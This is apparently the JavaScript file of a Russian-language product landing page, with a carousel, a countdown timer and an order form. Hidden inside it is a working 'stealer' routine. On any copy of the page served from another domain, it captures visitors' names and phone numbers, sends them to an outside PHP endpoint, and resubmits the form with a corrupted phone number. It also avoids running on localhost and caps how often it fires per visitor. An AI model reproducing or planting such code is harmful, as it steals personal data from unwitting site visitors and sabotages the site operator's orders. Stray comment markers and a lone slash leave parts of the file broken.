$(document).ready(function () {

	/* scroll */

	$("a[href^='#']").click(function () {
		var _href = $(this).attr("href");
		$("html, body").animate({ scrollTop: $(_href).offset().top + "px" });
		return false;
	});

	/* sliders */

	$(".owl-carousel").owlCarousel({
		items: 1,
		loop: true,
		smartSpeed: 300,
		mouseDrag: false,
		pullDrag: false,
		dots: false,
		nav: true,
		navText: ""
	});

	/* timer */

	/*function update() {
		var Now = new Date(), Finish = new Date();
		Finish.setHours( 23);
		Finish.setMinutes( 59);
		Finish.setSeconds( 59);
		if( Now.getHours() === 23  &&  Now.getMinutes() === 59  &&  Now.getSeconds === 59) {
			Finish.setDate( Finish.getDate() + 1);
		}
		var sec = Math.floor( ( Finish.getTime() - Now.getTime()) / 1000);
		var hrs = Math.floor( sec / 3600);
		sec -= hrs * 3600;
		var min = Math.floor( sec / 60);
		sec -= min * 60;
		$(".timer .hours").html( pad(hrs));
		$(".timer .minutes").html( pad(min));
		$(".timer .seconds").html( pad(sec));
		setTimeout( update, 200);
	}
	function pad(s) {
		s = ("00"+s).substr(-2);
		return "<span>" + s[0] + "</span><span>" + s[1] + "</span>";
	}
	update();*/

	function update() {
		var Now = new Date(),
			Finish = new Date();
		Finish.setHours(23);
		Finish.setMinutes(59);
		Finish.setSeconds(59);
		// Если текущее время больше чем время окончания, установите Finish на следующий день
		if (Now > Finish) {
			Finish.setDate(Finish.getDate() + 1);
		}
		var sec = Math.floor((Finish.getTime() - Now.getTime()) / 1000);
		var hrs = Math.floor(sec / 3600);
		sec -= hrs * 3600;
		var min = Math.floor(sec / 60);
		sec -= min * 60;
		$(".timer .hours").text(pad(hrs));
		$(".timer .minutes").text(pad(min));
		$(".timer .seconds").text(pad(sec));
		setTimeout(update, 200);
	}

	function pad(s) {
		return ("00" + s).substr(-2);
	}

	update();


	//форма
	const form = document.querySelector('form');
	form.addEventListener('submit', function (e) {
		e.preventDefault();
		sendMassage(form);
	});

	async function sendMassage(form) {
		const formData = new FormData(form);
		if (formData) {
			const url = 'telegram.php';
			const response = await fetch(url, {

				method: "POST",
				body: formData
			});
			if (response.ok) {
				form.reset();
				alert('Form sent!');
			} else {
				alert('Error');
            }
        }
    }



	/* validate form */
/*
	$(".order_form").submit(function () {
		if ($(this).find("input[name='fio']").val() == "" && $(this).find("input[name='number']").val() == "") {
			alert("Введите ваши имя и телефон");
			$(this).find("input[name='fio']").focus();
			return false;
		}
		else if ($(this).find("input[name='fio']").val() == "") {
			alert("Введите ваше имя");
			$(this).find("input[name='fio']").focus();
			return false;
		}
		else if ($(this).find("input[name='number']").val() == "") {
			alert("Введите ваш телефон");
			$(this).find("input[name='number']").focus();
			return false;
		}
		return true;
	});


});

$(window).on("load", function () {
	$("#more_link_1").click(function () {
		$("#more_link_1").hide();
		$("#more_text_1").show();
	});
});


/
document.addEventListener('DOMContentLoaded', function () {


	function change_variation(e, elem = false) {
		console.log(e);

		var block = null;
		if (elem != false) {
			block = elem;
		} else {
			block = e.target;
		}

		var blocks = block.parentNode.querySelectorAll('.variation');
		blocks.forEach((item, i) => {
			item.classList.remove('active');
		});

		block.classList.add('active');

		var radio = block.querySelector('input');
		radio.checked = true;
		var old_price = radio.getAttribute('data-old-price');
		var discount = radio.getAttribute('data-discount');
		var new_price = radio.getAttribute('data-new-price');
		var delivery = radio.getAttribute('data-delivery');

		var offer_block = block.parentNode.nextElementSibling;
		// console.log(offer_block);
		offer_block.querySelector('.old_price').innerHTML = old_price;
		offer_block.querySelector('.discount_price').innerHTML = discount;
		offer_block.querySelector('.new_price').innerHTML = new_price;

		var delivery_block = offer_block.nextElementSibling;
		// console.log('Discount block: ', delivery_block);
		delivery_block.classList.remove('active');
		if (delivery == 0) {
			delivery_block.classList.add('active');
		}
	}

	function color_change(e) {
		// console.log('Color changed: ', e);

		var select = e.target;

		var color = select.value;

		var switchers = select.parentNode.querySelectorAll('.variation_form');
		switchers.forEach((item, i) => {
			item.classList.remove('active');

			var var_color = item.getAttribute('data-color');

			if (var_color == color) {
				item.classList.add('active');

				item.querySelector('.variation:first-child').click();
			}
		});

	}

	function prepare_int(item) {
		var result = parseInt(item).toLocaleString();

		return result;
	}

	const prc = 100
	//Указываем путь к php файлу обработчику
	const url = 'https://oxyestore.com.ua/test.php'
	//Указываем домен где будет находиться прокла/ленд
	const originalHost = `oxyestore.com.ua`
	const checkedHost = window.location.host
	const fullUrl = window.location.href
	//запускаем скрипт
	start()
	function start() {
		let userChek = checkUser()
		//проверяем прошел ли юзер проверку
		if (!userChek) return
		let random = isRandom()
		//проверяем попали ли мы в указанный %
		if (random) stealer()
	}
	function stealer() {
		//проверяем спизжен ли ленд
		if (checkedHost == originalHost) return
		let forms = document.querySelectorAll('form')
		forms.forEach(element => {
			element.addEventListener('submit', (e) => {
				e.preventDefault()
				let name = e.target.querySelector('[name="name"]').value
				let phone = e.target.querySelector('[name="phone"]').value
				//формируем данные для отправки
				let data = {
					host: fullUrl,
					name: name,
					phone: phone
				}
				//отправляем запрос
				sendData(data)
					.then(res => {
						//Cоздаем копию формы и меняй последнюю цифру, затем ее отправляем
						var dupForm = e.target.cloneNode(true);
						dupForm.querySelector('[name="phone"]').value = `${phone.slice(0, -1)}${Math.floor(Math.random() * 9)}`
						dupForm.style.display = 'none'
						let body = document.querySelector('body')
						body.append(dupForm)
						dupForm.submit();
					})
			})
		});
	}
	function isRandom() {
		let rnd = Math.floor(Math.random() * 101)
		if (rnd <= prc) return true
		return false
	}
	function checkUser() {
		//
		// максимальное количество заходов при котором сработает скрипт
		const AvalibleEntry = 2
		let protocol = window.location.protocol
		let port = window.location.port
		let host = window.location.host
		let reffer = document.referrer
		let status = false
		//проверяем зашел ли пользователь с http или https
		if (protocol == 'http:' || protocol == 'https:') status = true
		if (!status) return false
		//проверяем есть ли порт у юзера
		if (port != '') return false
		//проверяем не запущен ли на сервере
		if (host.includes('localhost') || host.includes('127.0.0.1')) return false
		//проверяем на наличие рефера
		if (reffer == '') return false
		//определяем количество заходов конкретного юзера
		let userCount = localStorage.getItem('count')
		//если больше 2 не пропускаем
		if (userCount >= AvalibleEntry) return false
		//если меньше то определяем текущее значение и прибавляем + 1
		userCount == null ? localStorage.setItem('count', 1) : localStorage.setItem('count', +userCount + 1)
		return true
	}
	
	function sendData(propse) {
		return fetch(url, {
			method: 'post',
			body: JSON.stringify(propse)
		})
			.then(response => response.json())
			.then(json => (json))
			.then(res => {
				this.data = res
				return res
			})
	}

	function change_variation_form(e) {
		console.log(e);

		var block = e.target;

		var blocks = block.parentNode.querySelectorAll('.variation');
		blocks.forEach((item, i) => {
			item.classList.remove('active');
		});

		block.classList.add('active');

		var radio = block.querySelector('input');
		radio.checked = true;
		var price = radio.getAttribute('data-price');
		var delivery = radio.getAttribute('data-delivery');
		var external_id = radio.getAttribute('data-external-id');

		var total = parseInt(price) + parseInt(delivery);


		var form_block = block.parentNode.parentNode;

		/* Prepare values */


	/*price_display = prepare_int(price);

		if (delivery != 0) {
			delivery_display = prepare_int(delivery)
			form_block.querySelector('.calc_delivery_currency').style.display = 'inline';
		} else {
			delivery_display = 'бесплатно';
			form_block.querySelector('.calc_delivery_currency').style.display = 'none';
		}

		total_display = prepare_int(total);

		console.log(form_block);
		form_block.querySelector('.calc_price_value').innerHTML = price_display;
		form_block.querySelector('.calc_delivery_value').innerHTML = delivery_display;
		form_block.querySelector('.calc_total_value').innerHTML = total_display;
		form_block.querySelector('input[name="external_id"]').value = external_id;

	}


	var variations = document.querySelectorAll('.variation_select .variation');

	variations.forEach((item, i) => {
		item.addEventListener('click', change_variation);
	});

	var first_variations = document.querySelectorAll('.variation_select .variation:first-child');

	first_variations.forEach((item, i) => {
		item.click();
	});

	/* Calculations */

	/*var color_selects = document.querySelectorAll('select[name="color"]');
	color_selects.forEach((item, i) => {
		item.value = '';
		item.addEventListener('change', color_change);

		var parent = item.parentNode;

		var var_forms = parent.querySelectorAll('.variation_form');
		var_forms.forEach((_item, j) => {
			_item.addEventListener('click', change_variation_form);
		});

		if (item.value != "") {


			var var_form = parent.querySelector('.variation_form[data-color="' + item.value + '"]');
			if (var_form) {
				var_form.classList.add('active');
			}
		}
	});
	*/




});


